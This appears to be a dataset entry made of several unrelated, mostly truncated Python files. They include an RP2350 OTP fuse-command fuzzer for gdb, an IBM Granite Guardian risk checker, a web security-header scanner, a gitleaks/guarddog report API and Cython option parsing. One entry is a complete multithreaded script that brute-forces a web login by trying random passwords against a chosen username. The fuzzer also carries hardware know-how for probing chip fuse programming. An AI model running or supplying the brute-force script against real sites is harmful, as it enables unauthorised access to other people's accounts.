    "# Copyright (c) 2024 Aedan Cullen\n# portions Copyright (c) 2023 Raspberry Pi (Trading) Ltd.\n# SPDX-License-Identifier: GPL-3.0-or-later\n\n# ======= BRIDGE REGS =======\n\n# these are RPi-side, not 3PIP-side!\n# \"Serial and Byte-Parallel Interface\"\n\nOTP_HW_SBPI_INSTR = 0x40120100\nOTP_HW_SBPI_STATUS = 0x40120124\nOTP_HW_USR = 0x40120128\n\nOTP_SBPI_INSTR_EXEC_LSB = 30\nOTP_SBPI_INSTR_IS_WR_LSB = 29\nOTP_SBPI_INSTR_HAS_PAYLOAD_LSB = 28\nOTP_SBPI_INSTR_PAYLOAD_SIZE_M1_LSB = 24\nOTP_SBPI_INSTR_TARGET_LSB = 16\nOTP_SBPI_INSTR_CMD_LSB = 8\nOTP_SBPI_INSTR_SHORT_WDATA_LSB = 0\n\nOTP_SBPI_STATUS_MISO_BITS = 0x00ff0000\nOTP_SBPI_STATUS_FLAG_BITS = 0x00001000\nOTP_SBPI_STATUS_INSTR_MISS_BITS = 0x00000100\nOTP_SBPI_STATUS_INSTR_DONE_BITS = 0x00000010\nOTP_SBPI_STATUS_RDATA_VLD_BITS = 0x00000001\n\n# ===========================\n\n\n\n\n\nOTP_TARGET_DAP =      0x02\nOTP_TARGET_PMC =      0x3a\n\nOTP_REG_READ =        0x80 # 10nn_nnnn: read register n\nOTP_REG_WRITE =       0xc0 # 11nn_nnnn:\n\n# vvvvvvvvvv added vvvvvvvvvv\n\n# The above REG_READ and REG_WRITE are valid commands for both DAP and PMC.\n# nn_nnnn is the address (see regs listed below for each of DAP/PMC).\n\n# Additional commands *in this same format* used for PMC fuse programming only:\nOTP_PMC_START = 0x01 # start programming\nOTP_PMC_STOP = 0x02 # finish programming\n\n# Command MSB is clearly \"is register operation\"\n\n# ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nOTP_DAP_DR0 =         0x00 # Data 7:0\nOTP_DAP_DR1 =         0x01 # Data 15:8\nOTP_DAP_ECC =         0x20 # Data 23:16\nOTP_DAP_RQ0_RFMR =    0x30 # Read Mode Control, Charge Pump Control\nOTP_DAP_RQ1_VRMR =    0x31 # Read Voltage Control (VRR), CP enable\nOTP_DAP_RQ2_OVLR =    0x32 # IPS VQQ and VPP Control\nOTP_DAP_RQ3_IPCR =    0x33 # VDD detect, Ext. Ref. enable, IPS enable, OSC. Output Mode, Ext Ck enable, Ref Bias Disable\nOTP_DAP_RQ4_OSCR =    0x34 # Reserved for Test\nOTP_DAP_RQ5_ORCR =    0x35 # OTP ROM control, Test Mode Controls\nOTP_DAP_RQ6_ODCR =    0x36 # Read Timer Control\nOTP_DAP_RQ7_IPCR2 =   0x37 # IPS CP sync. Input Control, IPS reserved Control\nOTP_DAP_RQ8_OCER =    0x38 # OTP Bank Selection, PD control\nOTP_DAP_RQ9_RES0 =    0x39 # Reserved\nOTP_DAP_RQ10_DPCR =   0x3a # DATAPATH Control: (msb - lsb) {MUXQ[1:0], PASS, brpGEN. brpDIS, eccTST, eccGEN, eccDIS}\nOTP_DAP_RQ11_DPCR_2 = 0x3b # DATAPATH Control 2 \u2013 multi-bit prog. control {5\u2019b00000, MBPC[2:0]}\nOTP_DAP_CQ0 =         0x3c # OTP address LSBs\nOTP_DAP_CQ1 =         0x3d # OTP address MSBs\n\nOTP_PMC_MODE_0 =      0x30 # Bytes: 2 ; Default Read Conditions 0\nOTP_PMC_MODE_1 =      0x32 # Bytes: 2 ; Read Conditions 1\nOTP_PMC_MODE_2 =      0x34 # Bytes: 2 ; Read Conditions 2\nOTP_PMC_MODE_3 =      0x36 # Bytes: 2 ; Specific Function Usage\nOTP_PMC_TIMING_0 =    0x38 # Bytes: 1 ; Timing Control 0\nOTP_PMC_TIMING_1 =    0x39 # Bytes: 1 ; Timing Control 1\nOTP_PMC_TIMING_2 =    0x3a # Bytes: 1 ; Timing Control 2\nOTP_PMC_DAP_ADDR =    0x3b # Bytes: 1 ; DAP ID Address\nOTP_PMC_CQ =          0x3c # Bytes: 2 ; Function Control\nOTP_PMC_DFSR =        0x3e # Bytes: 1 ; Flag Selection (Read Only)\nOTP_PMC_CTRL_STATUS = 0x3f # Bytes: 1 ; Control Register (Write Only), STATUS (Read Only)\n\n# vvvvvvvvvv added vvvvvvvvvv\n\n#\n# Bits in OTP_PMC_CTRL_STATUS\n# \n# 0 0 0 0 _ 0 0 0 0\n# | \\_\\_\\___\\_\\_\\_\\__ programming enable/config (prior to OTP_PMC_START)\n# |\n# STATUS/BUSY (use w/ OTP_PMC_START and OTP_PMC_STOP commands)\n#\n\nOTP_PMC_CSR_STATUS_BITS = 0x80\n\n# ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n\n\n\n\nimport shlex\nimport argparse\nimport socket\nimport struct\nimport subprocess\nimport time\nimport pickle\n\nclass SBPIFuzzCommand(gdb.Command):\n    \"\"\"Try all possible SBPI commands.\"\"\"\n\n    def __init__(self):\n        super(SBPIFuzzCommand, self).__init__(\"sbpi_fuzz\", gdb.COMMAND_USER)\n\n        self.parser = argparse.ArgumentParser()\n\n    def complete(self, text, word):\n        return gdb.COMPLETE_SYMBOL\n\n    def sbpi_execute_command(self, is_wr, has_payload, payload_size_m1, target, cmd, short_wdata, execbit):\n        i = gdb.inferiors()[0]\n\n        i.write_memory(OTP_HW_USR, b\"\\x00\\x00\\x00\\x00\")\n\n        sbpi_instr = (\n            (is_wr << OTP_SBPI_INSTR_IS_WR_LSB) |\n            (has_payload << OTP_SBPI_INSTR_HAS_PAYLOAD_LSB) |\n            (payload_size_m1 << OTP_SBPI_INSTR_PAYLOAD_SIZE_M1_LSB) |\n            (target << OTP_SBPI_INSTR_TARGET_LSB) |\n            (cmd << OTP_SBPI_INSTR_CMD_LSB) |\n            (short_wdata << OTP_SBPI_INSTR_SHORT_WDATA_LSB) |\n            (execbit << OTP_SBPI_INSTR_EXEC_LSB)\n        )\n\n        i.write_memory(OTP_HW_SBPI_INSTR, struct.pack(\"<I\", sbpi_instr))\n        print(\"SBPI_INSTR:\", i.read_memory(OTP_HW_SBPI_INSTR, 4).tobytes()[::-1].hex())\n\n        status_mask = OTP_SBPI_STATUS_INSTR_MISS_BITS | OTP_SBPI_STATUS_INSTR_DONE_BITS\n\n        print(\"Waitng for bridge...\")\n        status_val = struct.unpack(\"<I\", i.read_memory(OTP_HW_SBPI_STATUS, 4).tobytes())[0]\n        while (status_val & status_mask) == 0:\n            time.sleep(0.001)\n            status_val = struct.unpack(\"<I\", i.read_memory(OTP_HW_SBPI_STATUS, 4)",
    "# guardian.py\n\n# Import necessary libraries and modules\nfrom ibm_watsonx_ai import APIClient, Credentials\nfrom ibm_watsonx_ai.foundation_models import ModelInference\nfrom dotenv import load_dotenv\nimport os\nfrom transformers import AutoTokenizer\nfrom utils import parse_output\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Retrieve Watsonx URL and API key from environment variables\nwatsonx_url = os.getenv(\"WATSONX_URL\")\napi_key = os.getenv(\"WAX_API_KEY\")\n\n# Set up credentials for IBM Watsonx AI\ncredentials = Credentials(\n    url=watsonx_url,\n    api_key=api_key,\n)\n\n# Initialize the API client with the provided credentials\nclient = APIClient(credentials)\n\n# Define the model to be used for inference\nmodel = ModelInference(\n    model_id=\"ibm/granite-guardian-3-8b\",\n    api_client=client,\n    project_id=os.getenv(\"PROJECT_ID\"),\n    params={\"max_new_tokens\": 100},\n)\n\n# Path to the Hugging Face model\nhf_model_path = \"ibm-granite/granite-guardian-3.0-8b\"  # 8B Model:\n# Load the tokenizer for the specified model\ntokenizer = AutoTokenizer.from_pretrained(hf_model_path)\n\n\ndef check_user_risk(user_prompt):\n    # Create a list of messages with the user prompt\n    messages = [{\"role\": \"user\", \"content\": user_prompt}]\n    # Apply chat template to the messages\n    chat = tokenizer.apply_chat_template(\n        messages, tokenize=False, add_generation_prompt=True\n    )\n    print(chat)  # Print the chat template for verification\n\n    # Generate a response from the model\n    result = model.generate(\n        prompt=[chat],\n        params={\n            \"decoding_method\": \"greedy\",\n            \"max_new_tokens\": 20,\n            \"temperature\": 0,\n            \"return_options\": {\n                \"token_logprobs\": True,\n                \"generated_tokens\": True,\n                \"input_text\": True,\n                \"top_n_tokens\": 5,\n            },\n        },\n    )\n    print(result)  # Print the model's result for verification\n\n    # Parse the output to get the label and probability of risk\n    label, prob_of_risk = parse_output(result[0][\"results\"][0][\"generated_tokens\"])\n\n    # Print the risk detection result and probability of risk\n    print(f\"\\n# risk detected? : {label}\")  # Yes\n    print(f\"# probability of risk: {prob_of_risk:.3f}\")  # 0.987\n\n    return label, prob_of_risk\n\n\ndef check_ai_risk(user_prompt, ai_response):\n    # Create a list of messages with the user prompt and ai response\n    messages = [\n        {\"role\": \"user\", \"content\": user_prompt},\n        {\"role\": \"assistant\", \"content\": ai_response},\n    ]\n    guardian_config = {\"risk_name\": \"unethical_behavior\"}\n    # Apply chat template to the messages\n    chat = tokenizer.apply_chat_template(\n        messages,\n        guardian_config=guardian_config,\n        tokenize=False,\n        add_generation_prompt=True,\n    )\n    print(chat)  # Print the chat template for verification\n\n    # Generate a response from the model\n    result = model.generate(\n        prompt=[chat],\n        params={\n            \"decoding_method\": \"greedy\",\n            \"max_new_tokens\": 20,\n            \"temperature\": 0,\n            \"return_options\": {\n                \"token_logprobs\": True,\n                \"generated_tokens\": True,\n                \"input_text\": True,\n                \"top_n_tokens\": 5,\n            },\n        },\n    )\n    print(result)  # Print the model's result for verification\n\n    # Parse the output to get the label and probability of risk\n    label, prob_of_risk = parse_output(result[0][\"results\"][0][\"generated_tokens\"])\n\n    # Print the risk detection result and probability of risk\n    print(f\"\\n# risk detected? : {label}\")  # Yes\n    print(f\"# probability of risk: {prob_of_risk:.3f}\")  # 0.987\n\n    return label, prob_of_risk\n\n\ndef check_answer_relevance(user_input, ai_response):\n    # Create a list of messages with the user prompt and ai response\n    messages = [\n        {\"role\": \"context\", \"content\": user_input},\n        {\"role\": \"assistant\", \"content\": ai_response},\n    ]\n    guardian_config = {\"risk_name\": \"answer_relevance\"}\n    # Apply chat template to the messages\n    chat = tokenizer.apply_chat_template(\n        messages,\n        guardian_config=guardian_config,\n        tokenize=False,\n        add_generation_prompt=True,\n    )\n    print(chat)  # Print the chat template for verification\n\n    # Generate a response from the model\n    result = model.generate(\n        prompt=[chat],\n        params={\n            \"decoding_method\": \"greedy\",\n            \"max_new_tokens\": 20,\n            \"temperature\": 0,\n            \"return_options\": {\n                \"token_logprobs\": True,\n                \"generated_tokens\": True,\n                \"input_text\": True,\n                \"top_n_tokens\": 5,\n            },\n        },\n    )\n    print(result)  # Print the model's result for verification\n\n    # Parse the output to get the label and probability of risk\n    label, prob_of_risk = parse_output(result[0][\"results\"][0][\"generated_tokens\"])\n\n    # Print the risk detection result and pro",
    "#!/usr/bin/env python3\n\nimport urllib.request\nimport urllib.error\nimport urllib.parse\nimport http.client\nimport socket\nimport sys\nimport ssl\nimport os\nimport json\nfrom optparse import OptionParser\n\n# This is a tool that was originally created by Santoru (# Copyright (C) 2019-2021  santoru)\n# I made a few adjustments to the tool to make it more useful for me, adding new features and changing some details, with that said, all credits to him\n# original tool: https://github.com/santoru/shcheck\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nclass darkcolours:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\nclass lightcolours:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[95m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\ndef log(string):\n    if options.json_output:\n        return\n    print(string)\n\nclient_headers = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en-US;q=0.8,en;q=0.3',\n    'Upgrade-Insecure-Requests': 1\n}\n\nsec_headers = {\n    'X-XSS-Protection': {\n        'description': \"Protects against cross-site scripting attacks by enabling or disabling XSS filtering in the browser.\",\n        'mitigation': \"1; mode=block\"\n    },\n    'X-Frame-Options': {\n        'description': \"Prevents the web page from being embedded into frames or iframes, mitigating clickjacking attacks.\",\n        'mitigation': \"SAMEORIGIN\"\n    },\n    'X-Content-Type-Options': {\n        'description': \"Prevents the browser from interpreting files as a different MIME type than what is specified.\",\n        'mitigation': \"nosniff\"\n    },\n    'Strict-Transport-Security': {\n        'description': \"Forces browsers to interact with the site only over HTTPS, mitigating man-in-the-middle attacks.\",\n        'mitigation': \"max-age=31536000; includeSubDomains\"\n    },\n    'Content-Security-Policy': {\n        'description': \"Defines approved sources of content for the browser to load, mitigating various injection attacks.\",\n        'mitigation': \"default-src 'self';\"\n    },\n    'X-Permitted-Cross-Domain-Policies': {\n        'description': \"Restricts Adobe Flash Player's access to data on a domain.\",\n        'mitigation': \"none\"\n    },\n    'Referrer-Policy': {\n        'description': \"Controls how much referrer information is included with requests made from the site.\",\n        'mitigation': \"no-referrer\"\n    },\n    'Expect-CT': {\n        'description': \"Allows sites to determine if they are being accessed via a misissued certificate.\",\n        'mitigation': \"max-age=86400, enforce\"\n    },\n    'Permissions-Policy': {\n        'description': \"Restricts the use of browser features like geolocation and camera access.\",\n        'mitigation': \"geolocation=(), camera=()\"\n    },\n    'Cross-Origin-Embedder-Policy': {\n        'description': \"Requires a secure embedding context, mitigating certain cross-origin attacks.\",\n        'mitigation': \"require-corp\"\n    },\n    'Cross-Origin-Resource-Policy': {\n        'description': \"Prevents resources from being shared with cross-origin contexts unless explicitly allowed.\",\n        'mitigation': \"same-origin\"\n    },\n    'Cross-Origin-Opener-Policy': {\n        'description': \"Isolates browsing contexts to prevent cross-origin information leaks.\",\n        'mitigation': \"same-origin\"\n    }\n}\n\nheaders = {}\n\ndef banner():\n    log(\"\")\n    log(\"======================================================\")\n    log(\" > HeaderHunter - TrK ................................\")\n    log(\"------------------------------------------------------\")\n    log(\" Simple tool to check security headers on a webserver \")\n    log(\"======================================================\")\n    log(\"\")\n\ndef colorize(string, alert):\n    bcolors = darkcolours\n    if options.colours == \"light\":\n        bcolors = lightcolours\n    elif options.colours == \"none\":\n        return string\n    color = {\n        'error':    bcolors.FAIL + string + bcolors.ENDC,\n        'warning':  bcolors.WARNING + string + bcolors.ENDC,\n        'ok':       bcolors.OKGREEN + string + bcolors.ENDC,\n        'info':     bcolors.OKBLUE +",
    "import sys\nimport json\n\ndef set_api_dict():\n    api_res = json.load(open('../../data/apis.json','r'))\n    api_dict = {}\n    \n    for line in api_res:\n        category_name = line.get(\"category_name\")\n        tool_name = line.get(\"tool_name\")\n        api_name = line.get(\"api_name\")\n        api_description = line.get(\"api_description\")\n        parameters = line.get('parameters')\n        properties = parameters.get(\"properties\")\n        tool_name = tool_name.replace(\"\u903b\u8f91\u8ba1\u7b97\",\"\u903b\u8f91\u8fd0\u7b97\")\n        api_name = api_name.replace(\"\u4e0e\u8ba1\u7b97\",\"\u4e0e\u8fd0\u7b97\").replace(\"\u6216\u8ba1\u7b97\",\"\u6216\u8fd0\u7b97\")\n        properties_descri = \"\"\n        N = 1\n        for i,j in properties.items():\n            if N == 1:\n                properties_descri += str(N)+\"\u3001\" + i + \"_\" + j.get(\"type\") + \"_\" + j.get(\"description\") + \"\uff1b\"\n            else:\n                properties_descri += str(N)+\":\" + i + \"_\" + j.get(\"type\") + \"_\" + j.get(\"description\") + \"\uff1b\"\n            N += 1\n        api_prompt = \"category_name:{}\u3002tool_name:{}\u3002api_name:{}\u3002api_\u529f\u80fd:{}\u3002\u9700\u8981\u8f93\u5165\u7684\u53c2\u6570:{}\".format(category_name,tool_name,api_name,api_description,properties_descri)\n        api_dict[tool_name+\"_\"+api_name] = api_prompt\n\ndef get_input(f_api_path, f_keyword_path, output_path, stage = \"test\"):\n    # \u5904\u7406\u4e3a\u6700\u9ad8\u5206\u683c\u5f0f\n    if stage == \"train\":\n        outputs = pd.read_excel('../data/train_withdev.xlsx')['label'].tolist()\n    f_api = open(f_api_path,'r')\n    f_keyword = open(f_keyword_path,'r')\n    fw = open(output_path,'w')\n    idx = 0\n    for api_line in f_api:\n        res = \"\u4f60\u73b0\u5728\u662f\u4e00\u4e2a\u91d1\u878d\u9886\u57df\u4e13\u5bb6\uff0c\u4f60\u9700\u8981\u6839\u636equery\u3001\u53ef\u80fd\u7684\u4ea7\u54c1\u6807\u51c6\u540d\u4ee5\u53ca\u9009\u62e9\u7684api\uff0c\u751f\u6210api\u53c2\u6570\u53ca\u4f9d\u8d56\u65b9\u5f0f\u7b49\uff0c\u4f7f\u5f97\u7528\u6237\u4f9d\u6b21\u6267\u884c\u8fd9\u4e9bapi\u80fd\u5f97\u5230\u5176\u60f3\u8981\u7684\u7b54\u6848\u3002\\n \"\n        standard_name_line = f_keyword.readline()\n        standard_names = json.loads(standard_name_line)['output']\n        res += f\"query\u662f\uff1a{json.loads(standard_name_line)['input']}\u3002\"\n        if standard_names != \"\" and len(standard_names) > 0:\n            res += \"\\n query\u4e2d\u63d0\u5230\u7684\u4ea7\u54c1\u6807\u51c6\u540d\u53ef\u80fd\u662f\uff1a\" + standard_names + \"\u3002\"\n        apis = json.loads(api_line)['api'].strip().split('||')[:-1]\n        res += \"\\n \u9009\u62e9\u7684api\u662f\uff1a\"\n        for api in apis:\n            res += \"{\" + api_dict[api] + \"}\"\n        if stage == \"train\":\n            fw.write(json.dumps({\"input\":res, \"output\":outputs[idx]}, ensure_ascii=False)+\"\\n\")\n        else:\n            fw.write(json.dumps({\"input\":res}, ensure_ascii=False)+\"\\n\")\n        idx += 1\n\nset_api_dict()\nget_input(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: MIT-0\n\n\"\"\"\nThis module provides functions to interact with the National Weather Service API\nand retrieve weather forecast data for a given weather station.\n\"\"\"\n\nimport requests\nfrom urllib.parse import urlparse\n\ndef get_weather_data(station_id: str) -> dict:\n    # Get latest observation for the weather station\n    base_url = \"https://api.weather.gov/stations\"\n    url = f\"{base_url}/{station_id}/observations/latest\"\n    allowed_hosts = [\"api.weather.gov\"]\n    host = urlparse(url).netloc\n    \n    if host in allowed_hosts:\n        response = requests.get(url, timeout=30)\n    else:\n        raise RuntimeError(\"URL is invalid\")\n    response.raise_for_status()\n\n    # Parse API response\n    data = response.json()\n\n    # Extract weather info\n    temperature = data['properties']['temperature']['value']\n    description = data['properties']['textDescription']\n\n    return {\"temperature\": temperature, \"description\": description, \"data\": data}",
    "from flask import Flask, request, jsonify\nfrom pymongo import MongoClient\nfrom bson.json_util import dumps\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\napp = Flask(__name__)\n\n\n# MongoDB URI (get this from your MongoDB Atlas account)\nMONGO_URI = os.getenv(\"MONGO_URL\") \n\n# Create a MongoDB client and database\nclient = MongoClient(MONGO_URI)\ndb = client[\"DiplomaThesis\"]  # Database name\n\n\n@app.route('/<tool_reports>/reports', methods=['POST'])\ndef insert_report(tool_reports):\n    try:\n        collection = db[tool_reports]\n        data = request.json  # Get the data from the incoming request\n        result = collection.insert_one(data)  # Insert data into MongoDB\n        return jsonify({\"status\": \"success\", \"message\": \"Document inserted\", \"id\": str(result.inserted_id)}), 200\n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n\n@app.route('/<tool_reports>/reports/<repo_name>', methods=['GET'])\ndef get_report(tool_reports, repo_name):\n    try:\n        collection = db[tool_reports]\n        report = collection.find_one({\"repo_name\": repo_name})  # Find report by repo_name\n        if report:\n            return jsonify({\"status\": \"success\", \"report\": dumps(report)}), 200  # Return the report in JSON format\n        else:\n            return jsonify({\"status\": \"error\", \"message\": \"Report not found\"}), 404\n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n\n@app.route('/<tool_reports>/reports', methods=['GET'])\ndef get_all_reports(tool_reports):\n    try:\n        collection = db[tool_reports]\n        reports = collection.find()  # Retrieve all reports from the collection\n        return jsonify({\"status\": \"success\", \"reports\": dumps(reports)}), 200\n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n\n@app.route('/<tool_reports>/reports/<repo_name>', methods=['PUT'])\ndef update_report(tool_reports,repo_name):\n    try:\n        collection = db[tool_reports]\n        data = request.json  # Get the data from the incoming request\n        result = collection.update_one({\"repo_name\": repo_name}, {\"$set\": data})  # Update the report\n        if result.matched_count > 0:\n            return jsonify({\"status\": \"success\", \"message\": \"Document updated\"}), 200\n        else:\n            return jsonify({\"status\": \"error\", \"message\": \"Report not found\"}), 404\n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n\n@app.route('/<tool_reports>/reports/<repo_name>', methods=['DELETE'])\ndef delete_report(tool_reports, repo_name):\n    try:\n        collection = db[tool_reports]\n        result = collection.delete_one({\"repo_name\": repo_name})  # Delete the report by repo_name\n        if result.deleted_count > 0:\n            return jsonify({\"status\": \"success\", \"message\": \"Document deleted\"}), 200\n        else:\n            return jsonify({\"status\": \"error\", \"message\": \"Report not found\"}), 404\n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n        \n@app.route('/final_results/gitleaks/<repo_name>', methods=['GET'])\ndef get_gitleaks_results(repo_name):\n    try:\n        collection = db['final_results']  # Access the correct collection\n        result = collection.find_one({\"repo_name\": repo_name, \"tool\": \"gitleaks\"})  # Find the report for the given repo and tool\n        \n        if result:  # Check if a result was found\n            # Directly extract the relevant fields instead of a non-existent 'report' field\n            leaks = result.get(\"leaks\")  # Extract the leaks field\n            if leaks is not None:  # Check if leaks exists\n                return jsonify({\"status\": \"success\", \"repo_name\": repo_name, \"tool\": \"gitleaks\", \"leaks\": leaks}), 200  # Return the result\n            else:\n                return jsonify({\"status\": \"error\", \"message\": \"'leaks' field not found in the result\"}), 404\n        else:\n            return jsonify({\"status\": \"error\", \"message\": \"Report not found for the given repo and tool\"}), 404\n        \n    except Exception as e:\n        return jsonify({\"status\": \"error\", \"message\": str(e)}), 500\n\n@app.route('/final_results/guarddog/<repo_name>', methods=['GET'])\ndef get_guarddog_results(repo_name):\n    try:\n        collection = db['final_results']  # Access the correct collection\n        result = collection.find_one({\"repo_name\": repo_name, \"tool\": \"guarddog\"})  # Find the report for the given repo and tool\n        \n        if result:  # Check if a result was found\n            # Directly extract the relevant fields instead of a non-existent 'report' field\n            malicious_indications = result.get(\"malicious_indications\")  # Extract the leaks field\n            if malicious_indications is not None:  # Check if leaks exists\n                return jsonify({\"status\": \"success\", \"repo_name\": repo_name, \"tool\": \"guarddog\", \"malicious indications\": malicious_indications}), 200  # Return the result\n       ",
    "import requests\nfrom bs4 import BeautifulSoup\nimport time\nimport random\nimport string\nimport threading\n\ndef attempt_login(url, username_field, password_field, username, password):\n    \"\"\"Attempts to log in and returns True on success, False otherwise.\"\"\"\n    try:\n        session = requests.Session()\n        response = session.get(url)\n        response.raise_for_status()\n        soup = BeautifulSoup(response.content, 'html.parser')\n\n        form = soup.find('form', {'id': 'ctl01'})\n        if not form:\n            return False\n\n        form_data = {}\n        for input_field in form.find_all('input'):\n            name = input_field.get('name')\n            value = input_field.get('value', '')\n            if name:\n                form_data[name] = value\n\n        form_data[username_field] = username\n        form_data[password_field] = password\n\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            \"Referer\": url\n        }\n\n        login_response = session.post(url, data=form_data, headers=headers, allow_redirects=False)\n        login_response.raise_for_status()\n\n        return login_response.status_code == 302\n\n    except requests.exceptions.RequestException:\n        return False\n    except Exception:\n        return False\n\ndef generate_random_password(length=7):\n    \"\"\"Generates a random password of exactly 7 characters using lowercase and uppercase letters.\"\"\"\n    characters = string.ascii_letters\n    return ''.join(random.choice(characters) for _ in range(length))\n\ndef worker(url, username_field, password_field, username, found_password):\n    \"\"\"Worker function to generate, attempt login, and repeat.\"\"\"\n    while not found_password.is_set():\n        password = generate_random_password()\n        print(f\"Trying password: {password}\", end='\\r')\n        if attempt_login(url, username_field, password_field, username, password):\n            print(f\"\\nSuccess! Password found: {password}\")\n            found_password.set()\n\nif __name__ == \"__main__\":\n    login_url = \"YOUR_URL_HERE\"\n    username_field = \"txtEmail(change field)\"\n    password_field = \"txtPassword(change field)\"\n\n    target_username = input(\"Enter the target username: \")\n    num_threads = 20\n    found_password = threading.Event()\n    start_time = time.time()\n\n    print(f\"Starting real-time brute-force attack with {num_threads} threads for username: {target_username}\")\n\n    threads = []\n    for _ in range(num_threads):\n        thread = threading.Thread(target=worker, args=(login_url, username_field, password_field, target_username, found_password))\n        threads.append(thread)\n        thread.start()\n\n    try:\n        for thread in threads:\n            thread.join()\n    except KeyboardInterrupt:\n        print(\"\\nBrute-force interrupted by user.\")\n        found_password.set()\n        for thread in threads:\n            thread.join()\n\n    end_time = time.time()\n    time_taken = end_time - start_time\n\n    if found_password.is_set():\n        print(f\"Time taken: {time_taken:.2f} seconds\")\n    else:\n        print(f\"Password not found within the attempts. Time taken: {time_taken:.2f} seconds\")\n\n    print(\"Brute-force process finished.\")\n",
    "#\r\n#   Cython - Command Line Parsing\r\n#\r\n\r\nfrom __future__ import absolute_import\r\n\r\nimport sys\r\nimport os\r\nfrom argparse import ArgumentParser, Action, SUPPRESS\r\nfrom . import Options\r\n\r\n\r\nif sys.version_info < (3, 3):\r\n    # TODO: This workaround can be removed in Cython 3.1\r\n    FileNotFoundError = IOError\r\n\r\n\r\nclass ParseDirectivesAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        old_directives = dict(getattr(namespace, self.dest,\r\n                                      Options.get_directive_defaults()))\r\n        directives = Options.parse_directive_list(\r\n            values, relaxed_bool=True, current_settings=old_directives)\r\n        setattr(namespace, self.dest, directives)\r\n\r\n\r\nclass ParseOptionsAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        options = dict(getattr(namespace, self.dest, {}))\r\n        for opt in values.split(','):\r\n            if '=' in opt:\r\n                n, v = opt.split('=', 1)\r\n                v = v.lower() not in ('false', 'f', '0', 'no')\r\n            else:\r\n                n, v = opt, True\r\n            options[n] = v\r\n        setattr(namespace, self.dest, options)\r\n\r\n\r\nclass ParseCompileTimeEnvAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        old_env = dict(getattr(namespace, self.dest, {}))\r\n        new_env = Options.parse_compile_time_env(values, current_settings=old_env)\r\n        setattr(namespace, self.dest, new_env)\r\n\r\n\r\nclass ActivateAllWarningsAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        directives = getattr(namespace, 'compiler_directives', {})\r\n        directives.update(Options.extra_warnings)\r\n        namespace.compiler_directives = directives\r\n\r\n\r\nclass SetLenientAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        namespace.error_on_unknown_names = False\r\n        namespace.error_on_uninitialized = False\r\n\r\n\r\nclass SetGDBDebugAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        namespace.gdb_debug = True\r\n        namespace.output_dir = os.curdir\r\n\r\n\r\nclass SetGDBDebugOutputAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        namespace.gdb_debug = True\r\n        namespace.output_dir = values\r\n\r\n\r\nclass SetAnnotateCoverageAction(Action):\r\n    def __call__(self, parser, namespace, values, option_string=None):\r\n        namespace.annotate = True\r\n        namespace.annotate_coverage_xml = values\r\n\r\n\r\ndef create_cython_argparser():\r\n    description = \"Cython (https://cython.org/) is a compiler for code written in the \"\\\r\n                  \"Cython language.  Cython is based on Pyrex by Greg Ewing.\"\r\n\r\n    parser = ArgumentParser(description=description, argument_default=SUPPRESS)\r\n\r\n    parser.add_argument(\"-V\", \"--version\", dest='show_version', action='store_const', const=1,\r\n                      help='Display version number of cython compiler')\r\n    parser.add_argument(\"-l\", \"--create-listing\", dest='use_listing_file', action='store_const', const=1,\r\n                      help='Write error messages to a listing file')\r\n    parser.add_argument(\"-I\", \"--include-dir\", dest='include_path', action='append',\r\n                      help='Search for include files in named directory '\r\n                           '(multiple include directories are allowed).')\r\n    parser.add_argument(\"-o\", \"--output-file\", dest='output_file', action='store', type=str,\r\n                      help='Specify name of generated C file')\r\n    parser.add_argument(\"-t\", \"--timestamps\", dest='timestamps', action='store_const', const=1,\r\n                      help='Only compile newer source files')\r\n    parser.add_argument(\"-f\", \"--force\", dest='timestamps', action='store_const', const=0,\r\n                      help='Compile all source files (overrides implied -t)')\r\n    parser.add_argument(\"-v\", \"--verbose\", dest='verbose', action='count',\r\n                      help='Be verbose, print file names on multiple compilation')\r\n    parser.add_argument(\"-p\", \"--embed-positions\", dest='embed_pos_in_docstring', action='store_const', const=1,\r\n                      help='If specified, the positions in Cython files of each '\r\n                           'function definition is embedded in its docstring.')\r\n   